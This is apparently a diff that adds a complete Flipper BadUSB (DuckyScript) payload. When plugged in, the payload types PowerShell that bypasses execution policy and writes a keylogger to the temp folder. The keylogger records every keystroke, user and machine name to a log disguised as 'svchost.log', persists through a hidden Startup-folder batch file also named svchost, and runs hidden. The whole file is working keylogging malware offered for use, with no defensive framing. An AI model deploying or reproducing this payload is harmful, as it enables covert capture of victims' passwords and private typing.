@@ -1,0 +1,162 @@
+REM Deploy Keylogger - Fixed v2
+REM Writes keylogger to single .ps1 file, starts as background job, adds persistence
+REM PowerShell window is visible during typing (required for HID keystroke delivery)
+
+GUI r
+DELAY 1000
+STRING powershell -nop -ep bypass
+ENTER
+DELAY 2000
+
+STRING Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+ENTER
+DELAY 500
+
+REM Write self-contained keylogger script to temp directory
+STRING Set-Content "$env:TEMP\logger.ps1" @'
+ENTER
+STRING Add-Type -TypeDefinition @"
+ENTER
+STRING using System;
+ENTER
+STRING using System.Runtime.InteropServices;
+ENTER
+STRING public class KL {
+ENTER
+STRING     [DllImport("user32.dll")]
+ENTER
+STRING     public static extern short GetAsyncKeyState(int k);
+ENTER
+STRING }
+ENTER
+STRING "@
+ENTER
+STRING $l = "$env:TEMP\svchost.log"
+ENTER
+STRING if(-not(Test-Path $l)){
+ENTER
+STRING     "=== FLIPPER KEYLOGGER ===" | Out-File $l -Encoding UTF8
+ENTER
+STRING     "Started: $(Get-Date)" | Out-File $l -Append -Encoding UTF8
+ENTER
+STRING     "User: $env:USERNAME@$env:COMPUTERNAME" | Out-File $l -Append -Encoding UTF8
+ENTER
+STRING     "" | Out-File $l -Append -Encoding UTF8
+ENTER
+STRING }
+ENTER
+STRING $lk = @{}; $buf = ""; $lf = Get-Date
+ENTER
+STRING Start-Sleep 5
+ENTER
+STRING while($true){
+ENTER
+STRING     Start-Sleep -Milliseconds 1
+ENTER
+STRING     $cb = ""
+ENTER
+STRING     for($i=8; $i -le 255; $i++){
+ENTER
+STRING         $s = [KL]::GetAsyncKeyState($i)
+ENTER
+STRING         if(($s -band 0x8000) -and -not $lk[$i]){
+ENTER
+STRING             $c = switch($i){
+ENTER
+STRING                 8 {"[BS]"}; 9 {"[TAB]"}; 13 {"`n"}
+ENTER
+STRING                 16 {""}; 17 {""}; 18 {""}; 20 {""}; 160 {""}; 161 {""}
+ENTER
+STRING                 27 {"[ESC]"}; 32 {" "}
+ENTER
+STRING                 33 {"[PGUP]"}; 34 {"[PGDN]"}; 35 {"[END]"}; 36 {"[HOME]"}
+ENTER
+STRING                 37 {"[LEFT]"}; 38 {"[UP]"}; 39 {"[RIGHT]"}; 40 {"[DOWN]"}
+ENTER
+STRING                 45 {"[INS]"}; 46 {"[DEL]"}
+ENTER
+STRING                 {$_ -ge 112 -and $_ -le 123} {"[F$($_ - 111)]"}
+ENTER
+STRING                 144 {"[NUM]"}; 145 {"[SCR]"}
+ENTER
+STRING                 186 {";"}; 187 {"="}; 188 {","}; 189 {"-"}; 190 {"."}
+ENTER
+STRING                 191 {"/"}; 192 {"~"}; 219 {"["}; 220 {"\"}; 221 {"]"}; 222 {"'"}
+ENTER
+STRING                 {$_ -ge 48 -and $_ -le 57} {[char]$i}
+ENTER
+STRING                 {$_ -ge 65 -and $_ -le 90} {
+ENTER
+STRING                     $sh = ([KL]::GetAsyncKeyState(16) -band 0x8000) -ne 0
+ENTER
+STRING                     $cp = [Console]::CapsLock
+ENTER
+STRING                     if($sh -xor $cp){[char]$i}else{[char]($i + 32)}
+ENTER
+STRING                 }
+ENTER
+STRING                 {$_ -ge 96 -and $_ -le 105} {[char]($i - 48)}
+ENTER
+STRING                 106 {"*"}; 107 {"+"}; 109 {"-"}; 110 {"."}; 111 {"/"}
+ENTER
+STRING                 default {if($i -ge 32 -and $i -le 126){[char]$i}else{""}}
+ENTER
+STRING             }
+ENTER
+STRING             if($c -ne ""){$cb += $c}
+ENTER
+STRING             $lk[$i] = $true
+ENTER
+STRING         } elseif(-not($s -band 0x8000)){
+ENTER
+STRING             $lk[$i] = $false
+ENTER
+STRING         }
+ENTER
+STRING     }
+ENTER
+STRING     if($cb){$buf += $cb}
+ENTER
+STRING     $tf = ((Get-Date) - $lf).TotalSeconds
+ENTER
+STRING     if($buf.Length -gt 30 -or $tf -gt 3 -or $buf -match "`n"){
+ENTER
+STRING         if($buf.Trim()){
+ENTER
+STRING             $ts = (Get-Date).ToString("HH:mm:ss")
+ENTER
+STRING             $cl = $buf -replace "`n"," [ENTER] "
+ENTER
+STRING             "[$ts] $cl" | Out-File $l -Append -Encoding UTF8
+ENTER
+STRING         }
+ENTER
+STRING         $buf = ""; $lf = Get-Date
+ENTER
+STRING     }
+ENTER
+STRING }
+ENTER
+STRING '@
+ENTER
+DELAY 1000
+
+REM Create startup persistence (2-line batch file referencing the same .ps1)
+STRING $p = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.bat"
+ENTER
+STRING "@echo off`r`npowershell -nop -ep bypass -w hidden -File `"%TEMP%\logger.ps1`"" | Out-File $p -Encoding ASCII
+ENTER
+DELAY 500
+
+REM Signal completion for retrieve payload
+STRING "DONE" | Out-File "$env:TEMP\badusb_status.txt" -Encoding ASCII
+ENTER
+DELAY 500
+
+REM Start keylogger LAST so it doesn't capture the deploy commands above
+REM logger.ps1 has a 5-second startup delay so it won't capture "exit" either
+STRING Start-Process powershell -ArgumentList "-nop -ep bypass -w hidden -File `"$env:TEMP\logger.ps1`"" -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING exit
+ENTER
